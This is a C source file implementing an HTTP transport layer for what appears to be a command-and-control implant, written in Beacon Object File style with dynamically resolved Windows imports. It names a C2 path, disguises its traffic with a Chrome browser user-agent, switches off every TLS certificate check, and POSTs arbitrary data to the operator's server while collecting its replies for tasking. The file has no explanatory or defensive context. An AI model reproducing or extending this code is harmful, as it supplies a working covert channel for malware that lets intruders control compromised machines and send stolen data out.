#include <windows.h>
#include <winhttp.h>
#include "transport.h"
#include "debug.h"

WINBASEAPI HINTERNET WINAPI WINHTTP$WinHttpOpen(
    LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
WINBASEAPI BOOL WINAPI WINHTTP$WinHttpSetOption(
    HINTERNET, DWORD, LPVOID, DWORD);
WINBASEAPI HINTERNET WINAPI WINHTTP$WinHttpConnect(
    HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
WINBASEAPI HINTERNET WINAPI WINHTTP$WinHttpOpenRequest(
    HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
WINBASEAPI BOOL WINAPI WINHTTP$WinHttpSendRequest(
    HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
WINBASEAPI BOOL WINAPI WINHTTP$WinHttpReceiveResponse(
    HINTERNET, LPVOID);
WINBASEAPI BOOL WINAPI WINHTTP$WinHttpQueryDataAvailable(
    HINTERNET, LPDWORD);
WINBASEAPI BOOL WINAPI WINHTTP$WinHttpReadData(
    HINTERNET, LPVOID, DWORD, LPDWORD);
WINBASEAPI BOOL WINAPI WINHTTP$WinHttpCloseHandle(HINTERNET);

WINBASEAPI void * MSVCRT$malloc(SIZE_T);
WINBASEAPI void   MSVCRT$free(void *);
WINBASEAPI void * MSVCRT$realloc(void *, size_t);
WINBASEAPI void * MSVCRT$memset(void *, int, size_t);
WINBASEAPI void * MSVCRT$memcpy(void *, const void *, size_t);

WINBASEAPI int WINAPI KERNELBASE$MultiByteToWideChar(
    UINT, DWORD, LPCCH, int, LPWSTR, int);

#ifndef C2_PATH
#define C2_PATH "/"
#endif

typedef struct {
    HINTERNET session;
    HINTERNET connection;
    INTERNET_PORT port;
    int https;
    char *last_response;
    SIZE_T last_response_size;
} HttpState;

static int http_atoi(const char *s) {
    int val = 0;
    if (!s) return 0;
    while (*s >= '0' && *s <= '9') {
        val = val * 10 + (*s - '0');
        s++;
    }
    return val;
}

static LPWSTR http_utf8_to_wide(const char *utf8) {
    if (!utf8) return NULL;
    int wide_len = KERNELBASE$MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
    if (wide_len == 0) return NULL;
    LPWSTR wide = (LPWSTR)MSVCRT$malloc(wide_len * sizeof(WCHAR));
    if (!wide) return NULL;
    if (KERNELBASE$MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wide, wide_len) == 0) {
        MSVCRT$free(wide);
        return NULL;
    }
    return wide;
}

int transport_startup(void) {
    return 0;
}

void *transport_connect(const char *host, const char *port) {
    if (!host || !port) return NULL;

    HttpState *state = (HttpState *)MSVCRT$malloc(sizeof(HttpState));
    if (!state) return NULL;
    MSVCRT$memset(state, 0, sizeof(HttpState));

    state->port = (INTERNET_PORT)http_atoi(port);

#ifdef C2_USE_HTTPS
    state->https = 1;
#else
    state->https = (state->port == 443) ? 1 : 0;
#endif

    state->session = WINHTTP$WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!state->session) {
        MSVCRT$free(state);
        return NULL;
    }

    if (state->https) {
        DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
        WINHTTP$WinHttpSetOption(state->session, WINHTTP_OPTION_SECURE_PROTOCOLS,
                                 &protocols, sizeof(protocols));
    }

    LPWSTR wide_host = http_utf8_to_wide(host);
    if (!wide_host) {
        WINHTTP$WinHttpCloseHandle(state->session);
        MSVCRT$free(state);
        return NULL;
    }

    state->connection = WINHTTP$WinHttpConnect(state->session, wide_host, state->port, 0);
    MSVCRT$free(wide_host);

    if (!state->connection) {
        WINHTTP$WinHttpCloseHandle(state->session);
        MSVCRT$free(state);
        return NULL;
    }

    return (void *)state;
}

int transport_send(void *connection, const void *data, size_t length) {
    if (!connection) return -1;
    HttpState *state = (HttpState *)connection;

    if (state->last_response) {
        MSVCRT$free(state->last_response);
        state->last_response = NULL;
        state->last_response_size = 0;
    }

    LPWSTR wide_path = http_utf8_to_wide(C2_PATH);
    if (!wide_path) return -1;

    DWORD flags = state->https ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET request = WINHTTP$WinHttpOpenRequest(
        state->connection, L"POST", wide_path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    MSVCRT$free(wide_path);
    if (!request) return -1;

    if (state->https) {
        DWORD ssl_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WINHTTP$WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS,
                                 &ssl_flags, sizeof(ssl_flags));
    }

    BOOL ok = WINHTTP$WinHttpSendRequest(request,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)data, (DWORD)length, (DWORD)length, 0);
    if (!ok) { WINHTTP$WinHttpCloseHandle(request); return -1; }

    if (!WINHTTP$WinHttpReceiveResponse(request, NULL)) {
        WINHTTP$WinHttpCloseHandle(request);
        return -1;
    }

    SIZE_T total = 0;
    char *body = NULL;
    DWORD avail = 0, rd = 0;

    while (WINHTTP$WinHttpQueryDataAvailable(request, &avail) && avail > 0) {
        char *tmp = (char *)MSVCRT$realloc(body, total + avail);
        if (!tmp) {
            if (body) MSVCRT$free(body);
            WINHTTP$WinHttpCloseHandle(request);
            return -1;
        }
        body = tmp;
        if (!WINHTTP$WinHttpReadData(request, body + total, avail, &rd)) {
            MSVCRT$free(body);
            WINHTTP$WinHttpCloseHandle(request);
            return -1;
        }
        total += rd;
    }

    state->last_response = body;
    state->last_response_size = total;

    WINHTTP$WinHttpCloseHandle(request);
    return 0;
}

int transport_receive(void *connection, void *buffer, size_t capacity) {
    if (!connection || !buffer || capacity == 0) return -1;
    HttpState *state = (HttpState *)connection;

    if (!state->last_response || state->last_response_size == 0) return -1;

    SIZE_T to_copy = state->last_response_size;
    if (to_copy > capacity) to_copy = capacity;

    MSVCRT$memcpy(buffer, state->last_response, to_copy);
    MSVCRT$free(state->last_response);
    state->last_response = NULL;
    state->last_response_size = 0;

    return (int)to_copy;
}

void transport_close(void *connection) {
    if (!connection) return;
    HttpState *state = (HttpState *)connection;
    if (state->connection) WINHTTP$WinHttpCloseHandle(state->connection);
    if (state->session) WINHTTP$WinHttpCloseHandle(state->session);
    if (state->last_response) MSVCRT$free(state->last_response);
    MSVCRT$free(state);
}

void transport_shutdown(void) {
}
